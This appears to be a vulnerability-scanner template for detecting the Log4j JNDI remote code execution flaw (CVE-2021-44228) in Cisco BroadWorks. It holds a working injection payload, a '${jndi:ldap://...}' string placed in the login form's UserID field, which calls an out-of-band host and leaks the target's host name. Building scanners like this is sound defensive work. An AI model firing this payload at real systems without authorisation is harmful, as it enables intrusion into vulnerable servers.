id: cisco-broadworks-log4j-rce
brief:
    title: Cisco BroadWorks - Remote Code Execution (Apache Log4j)
    by: shaikhyaser
    level: critical
    about: Cisco BroadWorks is susceptible to Log4j JNDI remote code execution. Cisco BroadWorks is an enterprise-grade calling and collaboration platform delivering unmatched performance, security and scale.
    label:
        - cve
        - cve2021
        - rce
        - jndi
        - log4j
        - cisco
        - oast
        - kev
        - vuln
    score: CVE-2021-44228 CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/commpilot/servlet/Login'
      head:
        Content-Type: application/x-www-form-urlencoded
        Origin: '{{RootURL}}'
        Referer: '{{RootURL}}'
      body: domain={{str}}.com&UserID=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&EnteredUserID=a&Password=a
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
